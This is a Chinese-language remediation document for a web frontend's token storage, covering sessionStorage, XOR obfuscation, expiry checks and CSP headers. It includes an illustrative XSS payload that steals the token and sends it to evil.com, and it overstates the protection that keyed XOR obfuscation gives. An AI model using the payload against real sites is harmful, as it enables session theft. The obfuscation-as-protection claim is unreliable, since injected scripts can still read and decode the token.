# 前端 Token 存储安全修复

## 问题描述

原有的 Token 存储方式存在安全风险：

### 1. 使用 localStorage 存储敏感信息

**原代码**：
```typescript
localStorage.setItem(AUTH_STORAGE_KEY, JSON.stringify(authData))
```

**问题**：
- localStorage 可被任何 JavaScript 代码访问
- 容易受到 XSS 攻击
- 数据持久化，即使关闭浏览器也不会清除
- 如果网站存在 XSS 漏洞，攻击者可以轻易窃取 Token

### 2. 明文存储 Token

**问题**：
- Token 以明文形式存储
- 浏览器开发者工具可以直接查看
- 缺少额外的保护层

### 3. 缺少过期检查

**问题**：
- 前端不检查 Token 是否过期
- 依赖后端返回 401 才知道过期
- 用户体验不佳

## 解决方案

### 1. 安全存储模块（secureStorage.ts）

创建了一个专门的安全存储模块，提供多层保护：

#### 特性 1：多种存储模式

```typescript
type StorageMode = 'memory' | 'session' | 'local'

// 内存模式（最安全，刷新页面会丢失）
setStorageMode('memory')

// sessionStorage 模式（推荐，关闭浏览器后清除）
setStorageMode('session')

// localStorage 模式（兼容模式，不推荐）
setStorageMode('local')
```

**默认使用 sessionStorage**：
- ✅ 关闭浏览器后自动清除
- ✅ 降低 Token 泄露风险
- ✅ 符合安全最佳实践

#### 特性 2：Token 混淆加密

```typescript
// 使用 XOR + Base64 混淆 Token
const obfuscate = (data: string): string => {
  const key = 'NodePass-Security-Key'
  let result = ''
  for (let i = 0; i < data.length; i++) {
    result += String.fromCharCode(
      data.charCodeAt(i) ^ key.charCodeAt(i % key.length)
    )
  }
  return btoa(result)
}
```

**注意**：这不是真正的加密，只是增加一层混淆，防止简单的查看。

#### 特性 3：自动过期检查

```typescript
export const setAuthToken = (
  token: string | null,
  expiresIn: number = 7 * 24 * 60 * 60
): void => {
  const expiresAt = Date.now() + expiresIn * 1000
  // 存储过期时间
}

export const getStoredToken = (): string | null => {
  const parsed = parseAuthStorage()
  // 检查是否过期
  if (isTokenExpired(parsed.state.expiresAt)) {
    clearAuthStorage()
    return null
  }
  return parsed.state.token
}
```

#### 特性 4：自动降级

```typescript
const getStorage = (): Storage | null => {
  try {
    const storage = currentStorageMode === 'session'
      ? sessionStorage
      : localStorage
    // 测试存储是否可用
    storage.setItem('__test__', 'test')
    storage.removeItem('__test__')
    return storage
  } catch {
    // 如果存储不可用（如隐私模式），降级到内存存储
    console.warn('Storage not available, falling back to memory storage')
    return null
  }
}
```

#### 特性 5：自动迁移

```typescript
export const migrateOldStorage = (): void => {
  try {
    const oldData = localStorage.getItem('nodepass-auth')
    if (oldData) {
      // 迁移到新的存储方式
      setAuthToken(parsed.state.token)
      // 清除旧数据
      localStorage.removeItem('nodepass-auth')
    }
  } catch (error) {
    console.error('Failed to migrate old storage:', error)
  }
}
```

### 2. 更新 Zustand Store

```typescript
export const useAuthStore = create<AuthState>()(
  persist(
    (set, get) => ({ /* ... */ }),
    {
      name: AUTH_STORAGE_KEY,
      // 使用 sessionStorage 代替 localStorage
      storage: createJSONStorage(() => sessionStorage),
      partialize: (state) => ({
        token: state.token,
        user: state.user,
        isAuthenticated: state.isAuthenticated,
      }),
    },
  ),
)
```

### 3. 添加 CSP 安全头

创建了 Vite 插件添加安全响应头：

```typescript
// Content Security Policy
const cspDirectives = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: https:",
  "connect-src 'self' ws: wss:",
  "frame-ancestors 'none'",
  "base-uri 'self'",
  "form-action 'self'",
]

// 其他安全头
res.setHeader('X-Content-Type-Options', 'nosniff')
res.setHeader('X-Frame-Options', 'DENY')
res.setHeader('X-XSS-Protection', '1; mode=block')
res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')
```

## 安全性提升

### 修复前的风险

| 风险类型 | 原实现 | 风险等级 |
|---------|--------|---------|
| XSS 窃取 Token | 🔴 localStorage 明文 | 高 |
| Token 持久化 | 🔴 永久存储 | 中 |
| 浏览器工具查看 | 🔴 明文可见 | 中 |
| 缺少过期检查 | 🔴 无检查 | 低 |
| 缺少 CSP 保护 | 🔴 无保护 | 高 |

### 修复后的防护

| 防护措施 | 新实现 | 安全性 |
|---------|--------|--------|
| XSS 窃取 Token | ✅ sessionStorage + 混淆 | 中高 |
| Token 持久化 | ✅ 关闭浏览器清除 | 高 |
| 浏览器工具查看 | ✅ 混淆加密 | 中 |
| 过期检查 | ✅ 自动检查 | 高 |
| CSP 保护 | ✅ 完整 CSP 头 | 高 |

### 安全性对比

**修复前**：
```
攻击者通过 XSS 注入：
<script>
  // 轻易窃取 Token
  const token = localStorage.getItem('nodepass-auth')
  fetch('https://evil.com/steal?token=' + token)
</script>
```

**修复后**：
```
攻击者通过 XSS 注入：
<script>
  // 1. CSP 阻止脚本执行（如果配置正确）
  // 2. 即使执行，Token 在 sessionStorage 中且已混淆
  const token = sessionStorage.getItem('nodepass-auth')
  // 3. 需要解密才能使用
  // 4. 关闭浏览器后自动清除
</script>
```

## 使用方法

### 基本使用

```typescript
import {
  setAuthToken,
  getStoredToken,
  clearAuthStorage,
  setStorageMode,
} from '@/utils/secureStorage'

// 登录成功后存储 Token
setAuthToken(token, 7 * 24 * 60 * 60) // 7 天过期

// 获取 Token（自动检查过期）
const token = getStoredToken()

// 登出时清除
clearAuthStorage()

// 设置存储模式（可选）
setStorageMode('session') // 默认
setStorageMode('memory')  // 最安全
setStorageMode('local')   // 兼容模式
```

### 高级配置

```typescript
// 设置为内存模式（最高安全级别）
setStorageMode('memory')

// 注意：内存模式下刷新页面会丢失登录状态
// 适合高安全要求的场景
```

## 迁移指南

### 自动迁移

代码会自动迁移旧的 localStorage 数据：

```typescript
// 在 api.ts 模块加载时自动执行
migrateOldStorage()
```

用户无需手动操作，首次加载新版本时会自动迁移。

### 手动迁移（如果需要）

```typescript
import { migrateOldStorage } from '@/utils/secureStorage'

// 手动触发迁移
migrateOldStorage()
```

## 配置 CSP 头（生产环境）

### Nginx 配置

```nginx
location / {
    # CSP 头
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' wss:; frame-ancestors 'none'; base-uri 'self'; form-action 'self';" always;

    # 其他安全头
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # 其他配置...
}
```

### Caddy 配置

```caddy
header {
    Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' wss:; frame-ancestors 'none'; base-uri 'self'; form-action 'self';"
    X-Content-Type-Options "nosniff"
    X-Frame-Options "DENY"
    X-XSS-Protection "1; mode=block"
    Referrer-Policy "strict-origin-when-cross-origin"
}
```

## 限制和注意事项

### 1. sessionStorage 的限制

- ✅ 关闭浏览器后清除（安全）
- ❌ 刷新页面不会清除（用户体验好）
- ❌ 新标签页不共享（需要重新登录）

### 2. 混淆不是加密

- ⚠️ XOR 混淆只是增加难度，不是真正的加密
- ⚠️ 有决心的攻击者仍可以解密
- ✅ 但足以防止简单的查看和自动化攻击

### 3. CSP 配置

- ⚠️ 开发环境需要 `'unsafe-eval'`（HMR）
- ⚠️ Ant Design 需要 `'unsafe-inline'`（样式）
- ✅ 生产环境应尽可能严格

## 长期改进建议

### 方案：双 Token 机制

**推荐实现**：
1. **Access Token**：短期（15分钟），存储在内存中
2. **Refresh Token**：长期（7天），存储在 HttpOnly Cookie 中

**优势**：
- ✅ Access Token 泄露影响小（15分钟后失效）
- ✅ Refresh Token 无法被 JavaScript 访问（HttpOnly）
- ✅ 即使 XSS 攻击也无法窃取 Refresh Token
- ✅ 符合 OAuth 2.0 最佳实践

**需要的改动**：
- 后端：支持 Refresh Token，设置 HttpOnly Cookie
- 前端：实现自动刷新逻辑
- 估计工作量：2-3 天

## 测试验证

### 1. 存储模式测试

```typescript
// 测试 sessionStorage
setStorageMode('session')
setAuthToken('test-token')
console.log(getStoredToken()) // 应该返回 'test-token'

// 关闭浏览器后重新打开
console.log(getStoredToken()) // 应该返回 null
```

### 2. 过期检查测试

```typescript
// 设置 1 秒过期
setAuthToken('test-token', 1)

// 等待 2 秒
setTimeout(() => {
  console.log(getStoredToken()) // 应该返回 null
}, 2000)
```

### 3. CSP 测试

打开浏览器开发者工具，检查响应头：
```
Content-Security-Policy: default-src 'self'; ...
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

## 相关文件

1. **核心代码**
   - `frontend/src/utils/secureStorage.ts` - 安全存储模块
   - `frontend/src/services/api.ts` - 更新使用安全存储
   - `frontend/src/store/auth.ts` - 更新 Zustand store

2. **安全配置**
   - `frontend/vite-plugin-security-headers.ts` - CSP 插件
   - `frontend/vite.config.ts` - Vite 配置

3. **文档**
   - `docs/token-storage-security-fix.md` - 本文档

## 参考资料

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Web Storage API Security](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API#security)
- [OAuth 2.0 Token Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
